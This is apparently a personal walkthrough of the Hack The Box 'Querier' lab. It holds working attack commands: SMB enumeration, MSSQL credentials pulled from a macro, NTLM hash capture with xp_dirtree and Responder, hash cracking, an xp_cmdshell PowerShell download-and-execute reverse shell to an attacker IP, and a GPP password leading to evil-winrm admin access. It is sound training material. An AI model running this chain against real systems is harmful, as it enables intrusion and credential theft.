## Querier

### Lab Details 

- Difficulty: Medium
- Type: MSSQL, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.194.248:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-04T02:04:17
|_Not valid after:  2055-10-04T02:04:17
| ms-sql-info: 
|   10.129.194.248:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-04T02:08:43+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
```
- get domain info with `enum4linux-ng `
```bash
 =============================================================
|    Domain Information via SMB session for 10.129.194.248    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: QUERIER
NetBIOS domain name: HTB
DNS domain: HTB.LOCAL
FQDN: QUERIER.HTB.LOCAL
Derived membership: domain member
Derived domain: HTB
```
- attempt to list `SMB` anonymously
```bash
$ smbclient -L //10.129.194.248/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.194.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
- found a unusual share `Reports`  
- login to `Reports` share and download remote files
```bash
$ smbclient //10.129.194.248/
$ recurse on 
$ prompt off
$ mget *
```
- downloaded file `Report.xlsm`
- open the file we get a message the this file contains `macros`
![[macro prompt.png]]
- open the file and locate `macros` 
![[macro.png]]
- found database connection info
```bash
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```
#### Initial Foothold 
- attempt to connect to `mssql` using `impacket-mssqlclient`
```bash
$ impacket-mssqlclient  reporting@10.129.194.248 -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```
- we can attempt to fetch password hash by requesting for a file on attackers end
```
SQL (QUERIER\reporting  reporting@volume)> EXEC master..xp_dirtree '\\10.10.14.82\share\'
```
- run `responder`
```
$ sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.194.248re\'
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:77686dc401bb2b8e:338F276CF81095866F59A0460C8D6653:010100000000000080319A88AF34DC01960D85B84A6C96BB00000000020008004200540051004E0001001E00570049004E002D0052005900470057003600420059004D0059004900510004003400570049004E002D0052005900470057003600420059004D005900490051002E004200540051004E002E004C004F00430041004C00030014004200540051004E002E004C004F00430041004C00050014004200540051004E002E004C004F00430041004C000700080080319A88AF34DC0106000400020000000800300030000000000000000000000000300000E8A33F6633E795D29E95A6EBF40C4FA10FE7B8153BA28C89B57DD9D5665338E00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003200000000000000000000000000

```
- crack the `NTLMv2` hash with john
```bash
MSSQL-SVC::QUERIER:77686dc401bb2b8e:338f276cf81095866f59a0460c8d6653:010100000000000080319a88af34dc01960d85b84a6c96bb00000000020008004200540051004e0001001e00570049004e002d0052005900470057003600420059004d0059004900510004003400570049004e002d0052005900470057003600420059004d005900490051002e004200540051004e002e004c004f00430041004c00030014004200540051004e002e004c004f00430041004c00050014004200540051004e002e004c004f00430041004c000700080080319a88af34dc0106000400020000000800300030000000000000000000000000300000e8a33f6633e795d29e95a6ebf40c4fa10fe7b8153ba28c89b57dd9d5665338e00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0038003200000000000000000000000000:corporate568
```
- use the new `db` credential to login to `mssql` again
- we have `SA` access with `mssql-svc` 
- attempt running reverse shell, [reverse shell at](https://github.com/antonioCoco/ConPtyShell)
```bash
$ impacket-mssqlclient MSSQL-SVC@10.129.194.248 -windows-auth
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.82:8000/Invoke-PowerShellTcp.ps1\");
```
- we get a reverse shell back on `nc`
```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.194.248] 49700
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
querier\mssql-svc
```
#### Lateral Movement (If any)

#### Privilege Escalation
- download [`PowerUp.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) and load onto the target
- import the script and run `Invoke-AllChecks`
```bash
PS C:\Users\mssql-svc> import-module .\PowerUp.ps1
PS C:\Users\mssql-svc> Invoke-AllChecks

 
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2384
ProcessId   : 5836
Name        : 5836
Check       : Process Token Privileges

ServiceName   : UsoSvc 
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps 
IdentityReference : QUERIER\mssql-svc 
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml 
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48} 
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

```
- we get the password for admin user
- attempt with `evil-winrm` to get admin reverse shell
```bash
$ evil-winrm -i 10.129.194.248 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
